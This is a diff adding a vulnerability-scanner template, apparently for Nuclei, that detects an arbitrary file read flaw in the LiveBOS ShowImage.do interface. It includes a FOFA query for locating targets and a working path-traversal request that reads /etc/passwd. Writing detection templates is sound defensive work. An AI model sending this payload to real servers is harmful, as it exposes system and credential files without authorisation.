@@ -1,0 +1,32 @@
+id: livebos-file-read
+
+info:
+  name: LiveBOS ShowImage.do - Arbitrary File Read
+  author: yusakie
+  severity: high
+  description: |
+    An arbitrary file read vulnerability exists in the LiveBOS ShowImage.do interface, which can be exploited to obtain sensitive files from the server.
+  reference:
+    - https://www.wevul.com/2301.html
+  metadata:
+    verified: "true"
+    max-request: 2
+    fofa-query: app="LiveBOS-框架" && body="管理控制台"
+  tags: livebos,lfi
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_1, "Power by LiveBOS")
+          - regex('root:.*:0', body_2)
+          - status_code_2 == 200
+        condition: and
